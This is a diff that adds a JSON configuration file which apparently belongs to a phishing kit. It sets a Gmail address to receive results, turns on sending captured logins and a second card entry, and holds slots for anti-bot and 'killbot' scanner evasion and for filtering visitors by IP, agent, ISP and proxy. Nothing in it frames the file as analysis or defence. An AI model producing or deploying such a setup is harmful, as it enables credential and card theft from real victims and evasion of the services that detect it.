@@ -1,0 +1,20 @@
+{
+    "email_result": "caplinsepele@gmail.com",
+    "parameter": "ryu",
+    "default_lang": "en",
+    "blocked_page": "403",
+    "antibot": "",
+    "killbot": "",
+    "ipstack": "",
+    "double_card": "1",
+    "pap": "1",
+    "email": "1",
+    "lock_lang": "0",
+    "one_time": "0",
+    "send_login": "1",
+    "ip": "0",
+    "agent": "0",
+    "host": "0",
+    "isp": "0",
+    "proxy": "0"
+}
